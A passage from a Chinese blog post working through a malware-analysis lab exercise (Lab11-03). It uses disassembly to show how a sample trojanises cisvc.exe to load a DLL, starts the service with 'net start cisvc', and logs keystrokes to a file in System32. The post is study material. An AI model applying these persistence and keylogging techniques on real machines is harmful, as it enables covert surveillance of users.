+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">01001AFF   .  <span class="number">68</span> <span class="number">00000000</span>   <span class="keyword">push</span> <span class="number">0x0</span></span><br><span class="line">01001B04   .  <span class="number">68</span> <span class="number">00000000</span>   <span class="keyword">push</span> <span class="number">0x0</span></span><br><span class="line">01001B09   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span>                                 <span class="comment">;  cisvc.01001B31</span></span><br><span class="line">01001B0A   .  FF55 FC       <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>]              <span class="comment">;  kernel32.LoadLibraryExA</span></span><br></pre></td></tr></table></figure>
+
+<p>即：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadLibraryExA(cisvc<span class="number">.01001B</span>31,<span class="number">0</span>,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>此时<code>cisvc.01001B31</code>为<code>C:\WINDOWS\System32\inet_epar32.dll</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">01001B31  43 3A 5C 57 49 4E 44 4F  C:\WINDO</span><br><span class="line">01001B39  57 53 5C 53 79 73 74 65  WS\Syste</span><br><span class="line">01001B41  6D 33 32 5C 69 6E 65 74  m32\inet</span><br><span class="line">01001B49  5F 65 70 61 72 33 32 2E  _epar32.</span><br><span class="line">01001B51  64 6C 6C 00 7A 7A 7A 36  dll.zzz6</span><br><span class="line">01001B59  39 38 30 36 35 38 32     9806582</span><br></pre></td></tr></table></figure>
+
+<p>用于加载Lab11-03.dll复制inet_epar32.dll。</p>
+<p>然后获取inet_epar32.dll中的函数<code>zzz69806582</code>并调用：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">01001B16   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span>                                 <span class="comment">;  inet_epa.zzz69806582</span></span><br><span class="line">01001B17   .  8B45 F0       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]          <span class="comment">;  inet_epa.10000000</span></span><br><span class="line">01001B1A   .  <span class="number">50</span>            <span class="keyword">push</span> <span class="built_in">eax</span>                                 <span class="comment">;  inet_epa.zzz69806582</span></span><br><span class="line">01001B1B   .  FF55 F4       <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xC</span>]              <span class="comment">;  kernel32.GetProcAddress</span></span><br><span class="line">01001B1E   .  <span class="number">8945</span> F8       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>],<span class="built_in">eax</span>           <span class="comment">;  inet_epa.zzz69806582</span></span><br><span class="line">01001B21   .  FF55 F8       <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>]              <span class="comment">;  inet_epa.zzz69806582</span></span><br></pre></td></tr></table></figure>
+
+<p>Lab11-03.exe修改完cisvc后启动该服务：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00401310</span> <span class="number">83</span> C4 <span class="number">04</span>                                <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401313</span> <span class="number">68</span> <span class="number">74</span> <span class="number">91</span> <span class="number">40</span> <span class="number">00</span>                          <span class="keyword">push</span>    offset aNetStartCisvc <span class="comment">; "net start cisvc"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401318</span> E8 9F <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                          <span class="keyword">call</span>    _system</span><br></pre></td></tr></table></figure>
+
+<p>Lab11-03.dll中的<code>zzz69806582</code>函数首先创建一个线程调用一个函数：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001544</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpThreadId</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001546</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; dwCreationFlags</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001548</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpParameter</span></span><br><span class="line"><span class="symbol">.text:</span>1000154A                 <span class="keyword">push</span>    offset StartAddress_oneinstance <span class="comment">; lpStartAddress</span></span><br></pre></td></tr></table></figure>
+
+<p><code>StartAddress_oneinstance</code>函数首先创建一个互斥量以确保只有一个实例运行：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">10001475</span>                 <span class="keyword">push</span>    offset Name     <span class="comment">; "MZ"</span></span><br><span class="line"><span class="symbol">.text:</span>1000147A                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; bInheritHandle</span></span><br><span class="line"><span class="symbol">.text:</span>1000147C                 <span class="keyword">push</span>    <span class="number">1F0001h</span>         <span class="comment">; dwDesiredAccess</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">10001481</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:OpenMutexA</span><br><span class="line">..................</span><br><span class="line"><span class="symbol">.text:</span><span class="number">1000149D</span>                 <span class="keyword">push</span>    offset Name     <span class="comment">; "MZ"</span></span><br><span class="line"><span class="symbol">.text:</span>100014A2                 <span class="keyword">push</span>    <span class="number">1</span>               <span class="comment">; bInitialOwner</span></span><br><span class="line"><span class="symbol">.text:</span>100014A4                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpMutexAttributes</span></span><br><span class="line"><span class="symbol">.text:</span>100014A6                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CreateMutexA</span><br></pre></td></tr></table></figure>
+
+<p>创建一个C:\WINDOWS\System32\kernel64x.dll文件：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>100014BD                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; hTemplateFile</span></span><br><span class="line"><span class="symbol">.text:</span>100014BF                 <span class="keyword">push</span>    <span class="number">80h</span>             <span class="comment">; dwFlagsAndAttributes</span></span><br><span class="line"><span class="symbol">.text:</span>100014C4                 <span class="keyword">push</span>    <span class="number">4</span>               <span class="comment">; dwCreationDisposition</span></span><br><span class="line"><span class="symbol">.text:</span>100014C6                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpSecurityAttributes</span></span><br><span class="line"><span class="symbol">.text:</span>100014C8                 <span class="keyword">push</span>    <span class="number">1</span>               <span class="comment">; dwShareMode</span></span><br><span class="line"><span class="symbol">.text:</span>100014CA                 <span class="keyword">push</span>    <span class="number">0C0000000h</span>      <span class="comment">; dwDesiredAccess</span></span><br><span class="line"><span class="symbol">.text:</span>100014CF                 <span class="keyword">push</span>    offset FileName <span class="comment">; "C:\\WINDOWS\\System32\\kernel64x.dll"</span></span><br><span class="line"><span class="symbol">.text:</span>100014D4                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CreateFileA</span><br></pre></td></tr></table></figure>
+
+<p>关键函数<code>get_input_10001380</code>用于击键记录：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">1000150D</span>                 <span class="keyword">push</span>    <span class="built_in">edx</span></span><br><span class="line"><span class="symbol">.text:</span>1000150E                 <span class="keyword">call</span>    get_input_10001380</span><br></pre></td></tr></table></figure>
+
+<p>kernel64x.dll中存放的即为记录的输入内容：</p>
+<p><img src="/2020/06/07/lab11/dbg4.JPG" alt></p>
+<h2 id="Q1：使用基础静态分析过程，你可以发现什么有趣的线索？"><a href="#Q1：使用基础静态分析过程，你可以发现什么有趣的线索？" class="headerlink" title="Q1：使用基础静态分析过程，你可以发现什么有趣的线索？"></a>Q1：使用基础静态分析过程，你可以发现什么有趣的线索？</h2><p>lab11-03.exe包含以下一些字符串：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span>004084F8	<span class="number">00000013</span>	C	GetLastActivePopup</span><br><span class="line"><span class="symbol">.rdata:</span>0040850C	<span class="number">00000010</span>	C	GetActiveWindow</span><br><span class="line"><span class="symbol">.rdata:</span>0040851C	0000000C	C	MessageBoxA</span><br><span class="line"><span class="symbol">.rdata:</span><span class="number">00408528</span>	<span class="number">0000000B</span>	C	user32<span class="number">.</span>dll</span><br><span class="line"><span class="symbol">.rdata:</span>004086EE	<span class="number">0000000D</span>	C	KERNEL32<span class="number">.</span>dll</span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409139</span>	<span class="number">00000024</span>	C	C:\\WINDOWS\\System32\\inet_epar32<span class="number">.</span>dll</span><br><span class="line"><span class="symbol">.data:</span><span class="number">0040915D</span>	0000000C	C	zzz69806582</span><br><span class="line"><span class="symbol">.data:</span>0040916C	<span class="number">00000006</span>	C	.text</span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409174</span>	<span class="number">00000010</span>	C	net start cisvc</span><br><span class="line"><span class="symbol">.data:</span><span class="number">00409184</span>	<span class="number">00000017</span>	C	C:\\WINDOWS\\System32\\%s</span><br><span class="line"><span class="symbol">.data:</span>0040919C	0000000A	C	cisvc<span class="number">.</span>exe</span><br><span class="line"><span class="symbol">.data:</span>004091A8	<span class="number">0000000D</span>	C	Lab11-<span class="number">03.</span>dll</span><br><span class="line"><span class="symbol">.data:</span>004091B8	<span class="number">00000024</span>	C	C:\\WINDOWS\\System32\\inet_epar32<span class="number">.</span>dll</span><br></pre></td></tr></table></figure>
+
+<p>说明该程序可能会修改cisvc.exe，使用Lab11-03.dll，创建C:\WINDOWS\System32\inet_epar32.dll。</p>
+<p>lab11-03.dll导入以下一些函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">100070F8		GetAsyncKeyState	USER32</span><br><span class="line">100070F0		GetForegroundWindow	USER32</span><br></pre></td></tr></table></figure>
+
+<p>说明该dll可能包含击键记录器的功能。</p>
+<h2 id="Q2：当运行这个代码的时，发生了什么？"><a href="#Q2：当运行这个代码的时，发生了什么？" class="headerlink" title="Q2：当运行这个代码的时，发生了什么？"></a>Q2：当运行这个代码的时，发生了什么？</h2><p>恶意代码将Lab11-03.dll复制为C:\WINDOWS\System32\inet_epar32.dll，修改了cisvc.exe，开启了cisvc功能，并通过dll的<code>zzz69806582</code>来记录键盘输入到C:\WINDOWS\System32\kernel64x.dll。</p>
+<h2 id="Q3：Lab11-03-exe如何安装Lab11-03-dll使其长期驻留？"><a href="#Q3：Lab11-03-exe如何安装Lab11-03-dll使其长期驻留？" class="headerlink" title="Q3：Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？"></a>Q3：Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？</h2><p>将Lab11-03.dll复制为C:\WINDOWS\System32\inet_epar32.dll，然后通过修改系统的cisvc.exe程序，并开启cisvc服务来保持Lab11-03.dll常驻。</p>
+<h2 id="Q4：这个恶意代码感染Windows系统的哪个文件？"><a href="#Q4：这个恶意代码感染Windows系统的哪个文件？" class="headerlink" title="Q4：这个恶意代码感染Windows系统的哪个文件？"></a>Q4：这个恶意代码感染Windows系统的哪个文件？</h2><p>感染了C:\WINDOWS\System32\cisvc.exe。</p>
+<h2 id="Q5：Lab11-03-dll做了什么？"><a href="#Q5：Lab11-03-dll做了什么？" class="headerlink" title="Q5：Lab11-03.dll做了什么？"></a>Q5：Lab11-03.dll做了什么？</h2><p>记录键盘和窗口输入，并保存在C:\WINDOWS\System32\kernel64x.dll中。</p>
+<h2 id="Q6：这个恶意代码将收集的数据存放在何处？"><a href="#Q6：这个恶意代码将收集的数据存放在何处？" class="headerlink" title="Q6：这个恶意代码将收集的数据存放在何处？"></a>Q6：这个恶意代码将收集的数据存放在何处？</h2><p>保存在C:\WINDOWS\System32\kernel64x.dll中。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/04/note20200604/" rel="next" title="note20200604">
+                <i class="fa fa-chevron-left"></i> note20200604
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/me.jpg"
+                alt="Ivoripuion" />
+            
+              <p class="site-author-name" itemprop="name">Ivoripuion</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab11-01"><span class="nav-number">1.</span> <span class="nav-text">Lab11-01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简要分析"><span class="nav-number">1.1.</span> <span class="nav-text">简要分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q1：这个恶意代码向磁盘释放了什么？"><span class="nav-number">1.2.</span> <span class="nav-text">Q1：这个恶意代码向磁盘释放了什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q2：这个恶意代码如何进行驻留？"><span class="nav-number">1.3.</span> <span class="nav-text">Q2：这个恶意代码如何进行驻留？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q3：这个恶意代码如何窃取用户登录凭证？"><span class="nav-number">1.4.</span> <span class="nav-text">Q3：这个恶意代码如何窃取用户登录凭证？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q4：这个恶意代码对窃取的凭证做了什么处理？"><span class="nav-number">1.5.</span> <span class="nav-text">Q4：这个恶意代码对窃取的凭证做了什么处理？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q5：如何在你的测试环境让这个恶意代码获得用户登录凭证？"><span class="nav-number">1.6.</span> <span class="nav-text">Q5：如何在你的测试环境让这个恶意代码获得用户登录凭证？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab11-02"><span class="nav-number">2.</span> <span class="nav-text">Lab11-02</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简要分析-1"><span class="nav-number">2.1.</span> <span class="nav-text">简要分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这个恶意DLL导出了什么？"><span class="nav-number">2.2.</span> <span class="nav-text">这个恶意DLL导出了什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用run32dll-exe来安装这个恶意代码之后，发生了什么？"><span class="nav-number">2.3.</span> <span class="nav-text">使用run32dll.exe来安装这个恶意代码之后，发生了什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#为了使这个恶意代码正确安装，Lab11-02-ini必须放置在何处？"><span class="nav-number">2.4.</span> <span class="nav-text">为了使这个恶意代码正确安装，Lab11-02.ini必须放置在何处？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这个安装的恶意代码如何驻留？"><span class="nav-number">2.5.</span> <span class="nav-text">这个安装的恶意代码如何驻留？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这个恶意代码采用的用户态Rootkit技术是什么？"><span class="nav-number">2.6.</span> <span class="nav-text">这个恶意代码采用的用户态Rootkit技术是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#挂钩代码做了什么？"><span class="nav-number">2.7.</span> <span class="nav-text">挂钩代码做了什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#哪个或者哪些进程执行了这个恶意攻击，为什么？"><span class="nav-number">2.8.</span> <span class="nav-text">哪个或者哪些进程执行了这个恶意攻击，为什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ini文件的意义是什么？"><span class="nav-number">2.9.</span> <span class="nav-text">ini文件的意义是什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你怎样用WireShark动态抓获这个恶意代码的行为？"><span class="nav-number">2.10.</span> <span class="nav-text">你怎样用WireShark动态抓获这个恶意代码的行为？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Lab11-03"><span class="nav-number">3.</span> <span class="nav-text">Lab11-03</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简要分析-2"><span class="nav-number">3.1.</span> <span class="nav-text">简要分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q1：使用基础静态分析过程，你可以发现什么有趣的线索？"><span class="nav-number">3.2.</span> <span class="nav-text">Q1：使用基础静态分析过程，你可以发现什么有趣的线索？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q2：当运行这个代码的时，发生了什么？"><span class="nav-number">3.3.</span> <span class="nav-text">Q2：当运行这个代码的时，发生了什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q3：Lab11-03-exe如何安装Lab11-03-dll使其长期驻留？"><span class="nav-number">3.4.</span> <span class="nav-text">Q3：Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q4：这个恶意代码感染Windows系统的哪个文件？"><span class="nav-number">3.5.</span> <span class="nav-text">Q4：这个恶意代码感染Windows系统的哪个文件？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q5：Lab11-03-dll做了什么？"><span class="nav-number">3.6.</span> <span class="nav-text">Q5：Lab11-03.dll做了什么？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Q6：这个恶意代码将收集的数据存放在何处？"><span class="nav-number">3.7.</span> <span class="nav-text">Q6：这个恶意代码将收集的数据存放在何处？</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ivoripuion</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":225,"height":450},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
